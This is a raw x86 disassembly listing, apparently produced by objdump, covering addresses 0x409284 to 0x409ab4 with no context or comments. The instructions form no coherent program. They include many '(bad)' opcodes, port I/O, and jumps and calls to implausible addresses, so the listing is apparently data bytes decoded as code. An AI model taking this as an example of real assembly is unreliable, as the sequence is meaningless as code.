  409284:	shl    DWORD PTR [ebx+0x2112e0ab],cl
  40928a:	sbb    ebx,DWORD PTR [edi+0x29]
  40928d:	ins    BYTE PTR es:[edi],dx
  40928e:	fsubr  DWORD PTR [edx+0x45349184]
  409294:	xor    bl,bl
  409296:	clc    
  409297:	in     eax,0x9c
  409299:	dec    ebp
  40929a:	pop    eax
  40929b:	push   edi
  40929c:	adc    al,BYTE PTR ds:0x2c7354e7
  4092a2:	popa   
  4092a3:	dec    eax
  4092a4:	int    0xf8
  4092a6:	repz lock push edx
  4092a9:	icebp  
  4092aa:	and    dh,BYTE PTR [esi]
  4092ac:	scas   al,BYTE PTR es:[edi]
  4092ad:	push   edx
  4092ae:	xor    BYTE PTR [edx],ah
  4092b0:	and    BYTE PTR [ebp+0x72dfaa14],cl
  4092b6:	hlt    
  4092b7:	or     ebp,ecx
  4092b9:	xor    al,0x98
  4092bb:	add    ch,BYTE PTR [ecx+0x13b76da3]
  4092c1:	(bad)  [ecx+eax*8+0x28]
  4092c5:	xchg   ax,ax
  4092c7:	mov    BYTE PTR [ebp-0x32],dh
  4092ca:	sbb    eax,0xb66c4f8e
  4092cf:	(bad)  
  4092d0:	lods   al,BYTE PTR ds:[esi]
  4092d1:	inc    ebp
  4092d2:	and    BYTE PTR [ebx],al
  4092d4:	sbb    ah,BYTE PTR [edi+0x3c]
  4092d7:	call   DWORD PTR [esi+0x1b2760bd]
  4092dd:	sub    bl,BYTE PTR [si-0x41]
  4092e1:	sbb    eax,0x71c8d04f
  4092e6:	mov    ds:0x9e8ef67c,al
  4092eb:	cmp    eax,0xc1df63be
  4092f0:	jmp    0x2960a7c3
  4092f5:	mov    edx,0xbdf00522
  4092fa:	jbe    0x40930a
  4092fc:	mov    BYTE PTR [edx+0x65],dh
  4092ff:	add    eax,DWORD PTR [ecx+0x52]
  409302:	es pop ebx
  409304:	fisubr WORD PTR [ecx-0x7d]
  409307:	mov    ah,0x8
  409309:	xor    al,0xad
  40930b:	sub    esi,0x41ed977c
  409311:	push   cs
  409312:	dec    DWORD PTR [ecx]
  409314:	jmp    0x4092b8
  409316:	int    0xd7
  409318:	popa   
  409319:	fisub  WORD PTR [esi+0x3d8270ed]
  40931f:	ret    
  409320:	mov    ds:0x7b9bee6,al
  409325:	out    0x65,ax
  409328:	jo     0x409318
  40932a:	add    bh,dh
  40932c:	ins    DWORD PTR es:[edi],dx
  40932d:	js     0x409395
  40932f:	cmp    DWORD PTR [edx],esp
  409331:	pushf  
  409332:	mov    al,0x15
  409334:	sbb    bl,dh
  409336:	or     bh,BYTE PTR [edi]
  409338:	aam    0x86
  40933a:	and    esp,0x5c7e2c38
  409340:	adc    bl,BYTE PTR [edi-0x7]
  409343:	sbb    BYTE PTR [eax+0x50703303],0x7b
  40934a:	push   cs
  40934b:	jle    0x4092e9
  40934d:	sub    eax,0xefa34362
  409352:	fs push es
  409354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409355:	or     esp,esi
  409357:	ins    DWORD PTR es:[edi],dx
  409358:	ins    DWORD PTR es:[edi],dx
  409359:	or     eax,0x93a0aa98
  40935e:	mov    dl,al
  409360:	in     eax,0x81
  409362:	or     BYTE PTR [edi-0x616315dd],cl
  409368:	rep stos DWORD PTR es:[edi],eax
  40936a:	sbb    BYTE PTR [eax+0x6184c33d],dh
  409370:	ret    
  409371:	push   ecx
  409372:	mov    bl,0xe1
  409374:	dec    esp
  409375:	test   BYTE PTR [eax-0x5c264dd9],dl
  40937b:	test   eax,0x91f73f2b
  409380:	push   esp
  409381:	pop    es
  409382:	rol    edi,0xd9
  409385:	jge    0x4093c3
  409387:	xchg   esp,eax
  409388:	aam    0xa
  40938a:	loope  0x40931f
  40938c:	dec    esi
  40938d:	mov    eax,ds:0x33085a2d
  409392:	jbe    0x409351
  409394:	and    al,0xf3
  409396:	jae    0x40933c
  409398:	sahf   
  409399:	mov    ecx,0x436f4564
  40939e:	pop    eax
  40939f:	cdq    
  4093a0:	push   eax
  4093a1:	pusha  
  4093a2:	pop    ebp
  4093a3:	sub    bh,BYTE PTR [edi-0x3577abd3]
  4093a9:	add    dl,BYTE PTR [ebx+0x7286271]
  4093af:	fcom   DWORD PTR [eax+0x1cd98ef5]
  4093b5:	jmp    0x5ea05e33
  4093ba:	push   cs
  4093bb:	out    dx,al
  4093bc:	mov    ebp,0xa0c45e2b
  4093c1:	adc    BYTE PTR [ecx+0x79],dh
  4093c4:	dec    ebx
  4093c5:	and    al,0xf5
  4093c7:	scas   al,BYTE PTR es:[edi]
  4093c8:	inc    edi
  4093c9:	mov    esp,0xa14d3214
  4093ce:	add    eax,0xa41a2ae0
  4093d3:	xchg   DWORD PTR [edx-0x2c],ecx
  4093d6:	mov    ah,0x5d
  4093d8:	loop   0x409394
  4093da:	mov    ds:0x5ef70ae9,al
  4093df:	jo     0x409411
  4093e1:	out    0x47,al
  4093e3:	push   cs
  4093e4:	pop    ds
  4093e5:	data16 gs stc 
  4093e8:	fisttp QWORD PTR ds:0xd5c50a9
  4093ee:	pop    ss
  4093ef:	retf   0x1a8a
  4093f2:	pushf  
  4093f3:	and    eax,DWORD PTR [ecx+0x79]
  4093f6:	xor    DWORD PTR [esp+esi*1+0x4a77b597],edx
  4093fd:	jmp    0x409449
  4093ff:	cdq    
  409400:	lods   eax,DWORD PTR ds:[esi]
  409401:	inc    esi
  409402:	jmp    0xe3aef6dc
  409407:	xor    eax,DWORD PTR [eax]
  409409:	ss push edx
  40940b:	or     eax,0xe1dccaad
  409410:	enter  0x8b83,0xec
  409414:	and    esp,ebx
  409416:	pop    ecx
  409417:	addr16 jle 0x409431
  40941a:	sahf   
  40941b:	aam    0x3c
  40941d:	test   al,0x8
  40941f:	(bad)  
  409420:	mov    eax,0xc61e1417
  409425:	xchg   ebx,edi
  409427:	push   ds
  409428:	das    
  409429:	push   ebp
  40942a:	cmp    bl,ah
  40942c:	mov    edx,0xdd6d4615
  409431:	adc    ah,BYTE PTR [edi+0x5feabb16]
  409437:	push   ecx
  409438:	mov    WORD PTR [ebx],fs
  40943a:	hlt    
  40943b:	aas    
  40943c:	mov    ecx,DWORD PTR [edi]
  40943e:	xor    ebp,DWORD PTR [ecx-0x54]
  409441:	dec    ebx
  409442:	jle    0x4093cc
  409444:	mov    esp,0x6e10f73d
  409449:	and    esp,0xffffffc5
  40944c:	unpcklps xmm5,XMMWORD PTR [edi+0x17]
  409450:	test   bl,0xb9
  409453:	dec    edi
  409454:	jb     0x40945b
  409456:	clc    
  409457:	(bad)  
  409458:	xchg   esi,eax
  409459:	pop    si
  40945b:	sar    DWORD PTR cs:[ebp-0x6ce630b7],1
  409462:	inc    esi
  409463:	and    al,0x76
  409465:	arpl   WORD PTR [ebp+ebp*4+0x24212b15],ax
  40946c:	div    BYTE PTR [eax]
  40946e:	aaa    
  40946f:	pop    esp
  409470:	jo     0x40948e
  409472:	repz dec edi
  409474:	scas   eax,DWORD PTR es:[edi]
  409475:	call   0x91e25418
  40947a:	adc    al,0x47
  40947c:	imul   edx,DWORD PTR [ecx+0x47],0x7c8bfd99
  409483:	rcl    BYTE PTR [edi+0x6a],cl
  409486:	pop    esi
  409487:	ret    
  409488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409489:	out    0xed,eax
  40948b:	(bad)  
  40948c:	fsubr  QWORD PTR [edx+eiz*2]
  40948f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409490:	bndstx [esi-0x31c94e7d],bnd1
  409497:	lods   eax,DWORD PTR ds:[esi]
  409498:	jp     0x409519
  40949a:	dec    edi
  40949b:	add    al,0xf4
  40949d:	adc    eax,0xa3dcfd6c
  4094a2:	fadd   st(5),st
  4094a4:	sbb    DWORD PTR [esi-0x5108b3fa],ebp
  4094aa:	sbb    DWORD PTR [eax-0x2a],ecx
  4094ad:	in     al,dx
  4094ae:	call   0x8b95:0x711fb9cb
  4094b5:	jo     0x40948b
  4094b7:	sub    eax,0xafd57035
  4094bc:	test   BYTE PTR [edi-0x47191999],al
  4094c2:	dec    ecx
  4094c3:	adc    eax,esp
  4094c5:	inc    edi
  4094c6:	adc    cl,dh
  4094c8:	mov    dl,0x51
  4094ca:	mov    bl,BYTE PTR ds:[eax+0x7e]
  4094ce:	add    eax,0xdaff5d2c
  4094d3:	rol    DWORD PTR [ebx-0x46],cl
  4094d6:	arpl   WORD PTR [ecx],bx
  4094d8:	hlt    
  4094d9:	xchg   DWORD PTR [ecx+ebx*1-0x5a],ebp
  4094dd:	jnp    0x4094ce
  4094df:	cmp    esi,ebx
  4094e1:	push   ebx
  4094e2:	add    DWORD PTR [ebp-0x37],eax
  4094e5:	and    ebx,DWORD PTR [ecx-0x6c]
  4094e8:	jg     0x40952c
  4094ea:	les    esp,FWORD PTR [ecx]
  4094ec:	pop    ebp
  4094ed:	cmp    al,0x4e
  4094ef:	push   0xffffff9b
  4094f1:	leave  
  4094f2:	mov    eax,0x844f560e
  4094f7:	push   edi
  4094f8:	hlt    
  4094f9:	stos   DWORD PTR es:[edi],eax
  4094fa:	mov    ch,0xdd
  4094fc:	lahf   
  4094fd:	dec    edi
  4094fe:	sbb    al,0xc8
  409500:	(bad)  
  409501:	test   DWORD PTR [esi+0x6ff19db0],esp
  409507:	dec    ebx
  409508:	repnz xor BYTE PTR [ecx],dh
  40950b:	pop    ecx
  40950c:	ins    DWORD PTR es:[edi],dx
  40950d:	stc    
  40950e:	adc    dl,BYTE PTR [ebx+0x49f2bd3c]
  409514:	and    ecx,DWORD PTR [esi-0x2a]
  409517:	sbb    BYTE PTR [edi+0xdc580f4],al
  40951d:	push   esi
  40951e:	es mov ah,0x9b
  409521:	fisub  WORD PTR [eax]
  409523:	pop    edi
  409524:	cli    
  409525:	push   cs
  409526:	push   ebp
  409527:	inc    esp
  409528:	cmp    eax,0xa0a5f200
  40952d:	sbb    esi,ebp
  40952f:	call   0x8a78a2a1
  409534:	dec    esi
  409535:	or     cl,BYTE PTR [ecx]
  409537:	out    0xa7,al
  409539:	loope  0x409556
  40953b:	xchg   esp,ecx
  40953d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40953e:	lahf   
  40953f:	push   ds
  409540:	xor    ecx,DWORD PTR [ebx+eiz*1-0x14b58a1d]
  409547:	sub    al,0xf
  409549:	dec    ebx
  40954a:	adc    BYTE PTR [edx+ebx*1-0x18],ch
  40954e:	aad    0x37
  409550:	and    ch,BYTE PTR [ecx+0x3f]
  409553:	add    bh,BYTE PTR ds:0x94adcc9c
  409559:	and    eax,0x50e98ed3
  40955e:	and    bl,BYTE PTR ds:[edx]
  409561:	inc    esi
  409562:	imul   ebp,DWORD PTR [ebx+0x47767b11],0x2fc49df2
  40956c:	ins    DWORD PTR es:[edi],dx
  40956d:	in     eax,0x25
  40956f:	or     DWORD PTR [edx-0x7838c20c],ecx
  409575:	mov    ds:0xf218ccfb,al
  40957a:	push   ebx
  40957b:	stc    
  40957c:	repz add bh,bh
  40957f:	and    esp,DWORD PTR [ecx-0x5622538c]
  409585:	mov    al,ds:0xcf73ceff
  40958a:	cmc    
  40958b:	fadd   QWORD PTR [eax-0x67c89673]
  409591:	adc    DWORD PTR [ebp+0x31],eax
  409594:	jnp    0x409589
  409596:	adc    BYTE PTR [edx-0x6b2e256d],ah
  40959c:	xchg   edx,eax
  40959d:	mov    ch,0xcd
  40959f:	jmp    0x40958b
  4095a1:	jl     0x409544
  4095a3:	pop    DWORD PTR [eax]
  4095a5:	pop    ecx
  4095a6:	push   0x69
  4095a8:	push   0xffffff87
  4095aa:	icebp  
  4095ab:	sub    eax,0x833da82e
  4095b0:	add    ebx,ebx
  4095b2:	inc    ecx
  4095b3:	int    0x43
  4095b5:	xor    al,0x8
  4095b7:	push   ss
  4095b8:	(bad)  
  4095ba:	fs xchg edx,eax
  4095bc:	and    ebp,DWORD PTR [ebp+0x61a6485c]
  4095c2:	lds    esp,FWORD PTR [edi-0x6f]
  4095c5:	dec    edx
  4095c6:	pop    esp
  4095c7:	enter  0x6877,0x6a
  4095cb:	stos   DWORD PTR es:[edi],eax
  4095cc:	inc    ecx
  4095cd:	cmp    al,0x6b
  4095cf:	xor    DWORD PTR [ecx],ebp
  4095d1:	xchg   BYTE PTR [esi],ah
  4095d3:	or     al,0x38
  4095d5:	pop    esp
  4095d6:	test   BYTE PTR [eax-0x3deac3a7],al
  4095dc:	call   0xbacb67d5
  4095e1:	imul   eax,DWORD PTR [edi],0x42241ce7
  4095e7:	adc    ecx,DWORD PTR [esi*2+0xfab057f]
  4095ee:	test   cl,bh
  4095f0:	and    dh,BYTE PTR [edi-0x17]
  4095f3:	fdivrp st(3),st
  4095f5:	inc    edx
  4095f6:	arpl   WORD PTR [ebx+0x4f],cx
  4095f9:	jle    0x409642
  4095fb:	jecxz  0x409622
  4095fd:	mov    ds:0xc4030409,eax
  409602:	(bad)  
  409603:	mul    BYTE PTR [esi]
  409605:	nop
  409606:	sahf   
  409607:	in     eax,dx
  409608:	mov    DWORD PTR [ebp+0x23b21f02],ebp
  40960e:	push   ebp
  40960f:	jge    0x40967d
  409611:	mov    ds:0xf1c3b850,eax
  409616:	mov    ds:0x7a01c160,al
  40961b:	in     eax,dx
  40961c:	cmp    eax,0x524018d
  409621:	rol    ch,1
  409623:	call   DWORD PTR [esi+0x751d2021]
  409629:	jae    0x4095e8
  40962b:	jns    0x4096a0
  40962d:	fst    st(3)
  40962f:	out    0x45,eax
  409631:	jb     0x409668
  409633:	pop    ecx
  409634:	jmp    0x82a07869
  409639:	sub    eax,0xfe93281b
  40963e:	(bad)  
  40963f:	sbb    ah,BYTE PTR ds:0xa322aef8
  409645:	fs daa 
  409647:	cwde   
  409648:	or     edx,DWORD PTR [eax]
  40964a:	inc    edi
  40964b:	ret    
  40964c:	mov    ecx,0x115e1010
  409651:	add    ch,BYTE PTR [ebx]
  409653:	addr16 loop 0x40967b
  409656:	mov    ch,0x5
  409658:	add    bh,BYTE PTR [edx+0x198a7b24]
  40965e:	adc    al,0x5b
  409660:	jmp    0x8449:0xa5cd31a3
  409667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409668:	push   0xa58b7282
  40966d:	lds    esi,FWORD PTR [ecx+edx*1]
  409670:	push   esi
  409671:	mov    ds:0xe72daee2,eax
  409676:	addr16 rol ebp,cl
  409679:	retf   0x34f1
  40967c:	bnd js 0x4096b6
  40967f:	and    esi,DWORD PTR [ecx]
  409681:	xor    ah,BYTE PTR [esp+edx*1-0x5e]
  409685:	push   ebx
  409686:	and    al,0xa3
  409688:	pop    edx
  409689:	call   0x88f03090
  40968e:	xor    al,0xe6
  409690:	rcl    bh,cl
  409692:	ret    
  409693:	jbe    0x409653
  409695:	push   edi
  409696:	ins    BYTE PTR es:[edi],dx
  409697:	pusha  
  409698:	sti    
  409699:	fst    DWORD PTR ss:[edi-0x52]
  40969d:	xchg   esi,eax
  40969e:	mov    bh,0xfb
  4096a0:	inc    ebp
  4096a1:	clc    
  4096a2:	push   0xeaec37af
  4096a7:	vpandn ymm0,ymm6,YMMWORD PTR [ebx+0x4ba8d3b7]
  4096af:	stos   BYTE PTR es:[edi],al
  4096b0:	inc    edi
  4096b1:	out    dx,eax
  4096b2:	nop
  4096b3:	mov    ds:0xfe00eca1,eax
  4096b8:	pop    esi
  4096b9:	mov    cl,0x26
  4096bb:	dec    ebx
  4096bc:	cs ja  0x409674
  4096bf:	push   ebx
  4096c0:	clc    
  4096c1:	(bad)  
  4096c2:	pusha  
  4096c3:	sbb    al,0xd9
  4096c5:	sub    BYTE PTR [edi+0x7a4fc244],0x79
  4096cc:	iret   
  4096cd:	push   ecx
  4096ce:	sbb    bh,ch
  4096d0:	mov    dl,0x25
  4096d2:	test   DWORD PTR ds:0xff162445,ebp
  4096d8:	mov    WORD PTR [eax+0x840b0d3],fs
  4096de:	pusha  
  4096df:	or     eax,0x6d59f05e
  4096e4:	adc    eax,0x19f4d673
  4096e9:	inc    edi
  4096ea:	and    al,0x77
  4096ec:	or     dl,cl
  4096ee:	out    dx,al
  4096ef:	mov    eax,ds:0x5cdb6021
  4096f4:	and    DWORD PTR [edx+edi*8-0x17],esi
  4096f8:	jmp    0x40976d
  4096fa:	je     0x409712
  4096fc:	(bad)  
  4096fd:	and    eax,0x54bc81ef
  409702:	mov    dl,0x5e
  409704:	bound  ebx,QWORD PTR [ecx+ebx*8-0x33]
  409708:	jl     0x40974c
  40970a:	jecxz  0x409724
  40970c:	mov    ebx,ss
  40970e:	repnz lea esi,[ecx-0x45]
  409712:	jo     0x4096a7
  409714:	mov    esi,0x5d144196
  409719:	cdq    
  40971a:	test   DWORD PTR [ecx],eax
  40971c:	daa    
  40971d:	dec    esi
  40971e:	lea    edi,[ebx+eax*8-0x5ec42671]
  409725:	dec    edx
  409726:	aad    0xa
  409728:	dec    edi
  409729:	jae    0x409795
  40972b:	push   0x4a
  40972d:	ss jae 0x40974d
  409730:	inc    eax
  409731:	or     al,0x8b
  409733:	std    
  409734:	jle    0x4096b9
  409736:	aam    0xba
  409738:	in     al,dx
  409739:	in     al,dx
  40973a:	add    eax,0x7df674c8
  40973f:	and    eax,0xed23ddec
  409744:	dec    esp
  409745:	xor    DWORD PTR [edx-0x5a9c321a],eax
  40974b:	pop    ds
  40974c:	daa    
  40974d:	(bad)  
  40974e:	out    dx,al
  40974f:	sbb    DWORD PTR [ecx+eiz*1+0x1ae4fbd9],ecx
  409756:	xchg   ecx,eax
  409757:	jmp    0x4096dc
  409759:	in     eax,dx
  40975a:	fadd   st,st(0)
  40975c:	mov    ds:0xe346fbb8,al
  409761:	in     eax,0xd1
  409763:	mov    edx,DWORD PTR [ecx+0x6a]
  409766:	adc    BYTE PTR [ecx-0x30],al
  409769:	jl     0x4097b8
  40976b:	int3   
  40976c:	add    BYTE PTR [edx+0x7eb24e6f],bh
  409772:	mov    cl,0xef
  409774:	imul   al
  409776:	xchg   ecx,eax
  409777:	test   al,0x88
  409779:	push   esp
  40977a:	xor    BYTE PTR [ecx+eiz*8+0x17],al
  40977e:	adc    edx,ebp
  409780:	lock enter 0x9336,0xaa
  409785:	pop    ebp
  409786:	cli    
  409787:	inc    esi
  409788:	cmp    DWORD PTR [ecx],edi
  40978a:	add    ah,ch
  40978c:	fdivr  DWORD PTR [esi]
  40978e:	xor    DWORD PTR [edi+0x40],edx
  409791:	test   DWORD PTR [ebx],ebp
  409793:	inc    ebp
  409794:	test   eax,0x2eaa59e6
  409799:	data16 mov dl,0x3a
  40979c:	fs aad 0xca
  40979f:	jge    0x4097f2
  4097a1:	ss daa 
  4097a3:	addr16 push ebp
  4097a5:	loope  0x409728
  4097a7:	mov    esp,0x6f7f6f29
  4097ac:	adc    eax,0xa10fb301
  4097b1:	arpl   WORD PTR [esi],sp
  4097b3:	dec    edi
  4097b4:	in     eax,0xfc
  4097b6:	mov    esi,0x9f2da26
  4097bb:	inc    edx
  4097bd:	add    edi,esi
  4097bf:	rcl    DWORD PTR [edx],1
  4097c1:	enter  0xf827,0xf4
  4097c5:	jmp    0xb68e:0x4b8caddc
  4097cc:	pop    ebx
  4097cd:	sbb    cl,BYTE PTR [ebx+0x69748a2]
  4097d3:	gs lock jp 0x4097be
  4097d7:	fcomi  st,st(6)
  4097d9:	jmp    0x4097bd
  4097db:	dec    ebp
  4097dc:	xchg   edi,esi
  4097de:	ins    DWORD PTR es:[edi],dx
  4097df:	jb     0x4097dc
  4097e1:	pop    esp
  4097e2:	push   ds
  4097e3:	xchg   BYTE PTR [esi+0x60],bl
  4097e6:	fist   DWORD PTR [edx-0x2f]
  4097e9:	or     BYTE PTR [ebx-0x6e417a9],ch
  4097ef:	imul   ecx,DWORD PTR [esi],0x72
  4097f2:	sub    al,0xee
  4097f4:	jno    0x40983a
  4097f6:	jmp    DWORD PTR [esi]
  4097f8:	and    DWORD PTR [ebp+0x1c],esi
  4097fb:	std    
  4097fc:	inc    esp
  4097fd:	repz cmc 
  4097ff:	or     ecx,DWORD PTR [ebp+ebx*8-0x31f9519b]
  409806:	arpl   WORD PTR [ebp-0x19],bp
  409809:	pop    ebx
  40980a:	call   0xccd594cf
  40980f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409810:	and    eax,0xb258c6a1
  409815:	popa   
  409816:	and    eax,0x3c2004e2
  40981b:	test   al,0x92
  40981d:	jnp    0x40982c
  40981f:	pop    ebx
  409820:	and    BYTE PTR cs:[ebx+0x1b4250ee],0xc9
  409828:	xor    dh,BYTE PTR [ebx+0x6f9c5516]
  40982e:	test   BYTE PTR [eax-0x3c1877fb],dh
  409834:	(bad)  
  409835:	pop    ecx
  409836:	push   ebx
  409837:	xor    ah,BYTE PTR ds:0x1b6929c2
  40983d:	sar    dl,1
  40983f:	ss aad 0xce
  409842:	imul   ch
  409844:	sbb    ah,0x5
  409847:	mov    eax,0xae8032ce
  40984c:	xchg   ecx,eax
  40984d:	adc    DWORD PTR [edi],esi
  40984f:	call   0x6887ba7b
  409854:	pop    edi
  409855:	lods   al,BYTE PTR ds:[esi]
  409856:	fidiv  WORD PTR [esp+edi*1-0x68]
  40985a:	(bad)  
  40985b:	js     0x409831
  40985d:	jno    0x40986b
  40985f:	inc    edx
  409860:	mov    dl,0xf7
  409862:	xchg   ebp,eax
  409863:	push   0x77
  409865:	pop    ecx
  409866:	fld    DWORD PTR ds:0x2451f915
  40986c:	test   DWORD PTR ds:0xa420d3c7,0x93e4bd5b
  409876:	mov    eax,ds:0x85bc099a
  40987b:	loope  0x40984a
  40987d:	add    eax,0x613ccc29
  409882:	mov    ds:0xe1f3445,al
  409887:	xor    dl,BYTE PTR [ecx-0x7ff85f3d]
  40988d:	stos   BYTE PTR es:[edi],al
  40988e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40988f:	push   cs
  409890:	xlat   BYTE PTR ds:[ebx]
  409891:	(bad)  
  409892:	push   es
  409893:	shr    DWORD PTR [eax+0x5e],1
  409896:	iret   
  409897:	int3   
  409898:	pop    edi
  409899:	lds    ebx,FWORD PTR [edx-0x5df3c89d]
  40989f:	jae    0x40984b
  4098a1:	push   ebx
  4098a2:	push   esp
  4098a3:	or     DWORD PTR [esi],edi
  4098a5:	xor    edi,DWORD PTR [ebp+ebx*2-0x4baa2d39]
  4098ac:	pop    ecx
  4098ad:	sti    
  4098ae:	adc    eax,0xff8d098c
  4098b3:	lods   eax,DWORD PTR ds:[esi]
  4098b4:	imul   edx,edi,0xffffffff
  4098b7:	es dec edi
  4098b9:	les    ecx,FWORD PTR ds:[ebx+0x3aac46e4]
  4098c0:	push   0x26cb99f7
  4098c5:	fs pop edi
  4098c7:	cwde   
  4098c8:	adc    edi,esp
  4098ca:	je     0x409874
  4098cc:	add    ah,al
  4098ce:	loop   0x409908
  4098d0:	pop    es
  4098d1:	ja     0x40992c
  4098d3:	xlat   BYTE PTR ds:[ebx]
  4098d4:	sub    eax,0x8052858
  4098d9:	inc    edi
  4098da:	sub    BYTE PTR [ecx],0x42
  4098dd:	dec    ebx
  4098de:	mov    bl,BYTE PTR [eax+0x4fafd610]
  4098e4:	mov    ebp,0x8783b64
  4098e9:	dec    eax
  4098ea:	push   ds
  4098eb:	mul    DWORD PTR [ecx]
  4098ed:	bound  ebx,QWORD PTR [esi-0x27cf7441]
  4098f3:	inc    esi
  4098f4:	mov    al,ds:0x1e87f966
  4098f9:	test   al,0x10
  4098fb:	int    0x7d
  4098fd:	mov    dh,0x4f
  4098ff:	dec    ebp
  409900:	pop    es
  409901:	or     eax,0xd1d25941
  409906:	cld    
  409907:	jp     0x409895
  409909:	or     BYTE PTR [eax-0x1c0d9bfd],ah
  40990f:	sbb    al,0x12
  409911:	add    ch,ah
  409913:	and    dh,ah
  409915:	inc    ebx
  409916:	xchg   ebx,eax
  409917:	add    BYTE PTR [esi],dh
  409919:	jp     0x409986
  40991b:	mov    ds:0x2e032c,eax
  409920:	add    eax,0xd865ef2
  409925:	jl     0x4098ee
  409927:	rcr    BYTE PTR [ebx-0x30],cl
  40992a:	jne    0x4098ea
  40992c:	push   edi
  40992d:	(bad)  
  40992f:	addr16 pop ebp
  409931:	inc    ebp
  409932:	je     0x4098e8
  409934:	sbb    BYTE PTR [eax+0x6f],cl
  409937:	pop    esp
  409938:	xor    ecx,edx
  40993a:	aad    0xaa
  40993c:	add    esp,edi
  40993e:	int    0x71
  409940:	mov    eax,DWORD PTR [ebx-0x49]
  409943:	mov    cl,0xd5
  409945:	sub    al,BYTE PTR [edi+ebp*8]
  409948:	and    bl,BYTE PTR [edx+esi*8]
  40994b:	fs loopne 0x40990b
  40994e:	pop    edi
  40994f:	mov    edi,0x352d35f0
  409954:	leave  
  409955:	sub    eax,0xb6e7cdbc
  40995a:	push   DWORD PTR [edi]
  40995c:	push   ecx
  40995d:	mov    esp,0x95ea8de5
  409962:	int    0xb7
  409964:	inc    ecx
  409965:	and    eax,0x823378c6
  40996a:	loop   0x40994e
  40996c:	hlt    
  40996d:	ja     0x409987
  40996f:	dec    ebp
  409970:	inc    eax
  409971:	dec    ebx
  409972:	cmp    esp,ebp
  409974:	test   al,0x87
  409976:	lahf   
  409977:	cmp    BYTE PTR [edi-0x38],0xee
  40997b:	push   edx
  40997c:	or     ch,BYTE PTR [ebp-0x5062437f]
  409982:	xor    dl,ah
  409984:	jecxz  0x4099b3
  409986:	xlat   BYTE PTR ds:[ebx]
  409987:	enter  0xead0,0x93
  40998b:	arpl   sp,sp
  40998d:	(bad)  
  40998e:	or     al,0x2
  409990:	das    
  409991:	push   esp
  409992:	xchg   DWORD PTR [ecx+0x253b9623],eax
  409998:	mov    ch,0x1a
  40999a:	test   edi,ecx
  40999c:	push   0x896b95d6
  4099a1:	(bad)  
  4099a2:	fsubr  st,st(0)
  4099a4:	pop    ecx
  4099a5:	fcom   DWORD PTR [esi+0x7e]
  4099a8:	fsubr  DWORD PTR [edx+0x110898b5]
  4099ae:	xor    DWORD PTR [ecx],ecx
  4099b0:	aaa    
  4099b1:	or     DWORD PTR [esi],edx
  4099b3:	add    DWORD PTR [esi+0x9],0x2e2e87d7
  4099ba:	fdivr  st(3),st
  4099bc:	xchg   ebp,eax
  4099bd:	ror    esp,0xfd
  4099c0:	(bad)  
  4099c1:	sbb    edx,DWORD PTR [bp+di+0x5fc8]
  4099c6:	add    DWORD PTR [ecx-0x393a9664],ebx
  4099cc:	pop    ebx
  4099cd:	sbb    eax,0xc94195da
  4099d2:	adc    eax,0x30beed0a
  4099d7:	stos   BYTE PTR es:[edi],al
  4099d8:	mov    WORD PTR [eax+0x5dcf48ff],gs
  4099de:	mov    ds:0x65cb82b5,eax
  4099e3:	and    BYTE PTR [eax-0x43a04c8a],0xcb
  4099ea:	jbe    0x4099cd
  4099ec:	fucompp 
  4099ee:	rcl    DWORD PTR [ecx+ecx*4-0x40334c63],1
  4099f5:	jecxz  0x409a3f
  4099f7:	add    eax,edx
  4099f9:	mov    bl,0x0
  4099fb:	jecxz  0x409a62
  4099fd:	mov    bl,0xdb
  4099ff:	int3   
  409a00:	sbb    eax,0x1125fa31
  409a05:	xor    al,0x45
  409a07:	or     al,0x2c
  409a09:	sub    al,0x43
  409a0b:	fsubr  st(3),st
  409a0d:	push   0x7ed32045
  409a12:	or     BYTE PTR [edi],ah
  409a14:	(bad)  
  409a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a16:	and    DWORD PTR [ecx-0x7377279f],edx
  409a1c:	jo     0x4099ae
  409a1e:	sub    BYTE PTR [esi],cl
  409a20:	cmp    BYTE PTR [ecx+0x9],0x65
  409a24:	and    al,0x63
  409a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a27:	call   0x22fa:0xec3e4ff7
  409a2e:	das    
  409a2f:	adc    edi,0xea2ceb90
  409a35:	imul   esi,DWORD PTR [edx-0x4b6c8dc],0x476f2475
  409a3f:	cld    
  409a40:	pop    eax
  409a41:	ds ss ret 0x894a
  409a46:	xor    dh,BYTE PTR [ebx]
  409a48:	pop    ebp
  409a49:	or     BYTE PTR [ecx],ch
  409a4b:	jb     0x409a3b
  409a4d:	icebp  
  409a4e:	mov    ds:0xf37d2eb1,al
  409a53:	cwde   
  409a54:	mov    ebp,0xc93a4c47
  409a59:	arpl   WORD PTR [ebx],sp
  409a5b:	xchg   edx,eax
  409a5c:	shl    BYTE PTR [ebp+0x20dc7f52],1
  409a62:	dec    esp
  409a63:	sbb    DWORD PTR [ecx+0x7e161fc6],edx
  409a69:	bound  ecx,QWORD PTR [ecx]
  409a6b:	sti    
  409a6c:	clc    
  409a6d:	sahf   
  409a6e:	jg     0x4099f5
  409a70:	jge    0x409ae3
  409a72:	stos   DWORD PTR es:[edi],eax
  409a73:	xchg   esi,eax
  409a74:	(bad)  
  409a75:	sahf   
  409a76:	dec    ecx
  409a77:	mov    ch,0x72
  409a79:	ficomp WORD PTR [edx+0x6d]
  409a7c:	mov    al,ds:0x1e713d57
  409a81:	ficom  DWORD PTR [edx+0x68f30ca8]
  409a87:	rcr    DWORD PTR [edx],cl
  409a89:	or     eax,0xd8e72604
  409a8e:	dec    eax
  409a8f:	retf   
  409a90:	inc    edx
  409a91:	je     0x409ad4
  409a93:	cli    
  409a94:	xor    BYTE PTR [ebx+0x17ca5b73],al
  409a9a:	xor    al,0xd8
  409a9c:	push   edi
  409a9d:	pop    esi
  409a9e:	cmp    cl,BYTE PTR [ecx-0x514ff287]
  409aa4:	stos   DWORD PTR es:[edi],eax
  409aa5:	(bad)  
  409aa6:	fcomp  QWORD PTR [ebx-0x29c9db10]
  409aac:	or     dl,BYTE PTR [eax*4+0x50f7dc5b]
  409ab3:	xchg   ebx,eax
  409ab4:	out    dx,eax
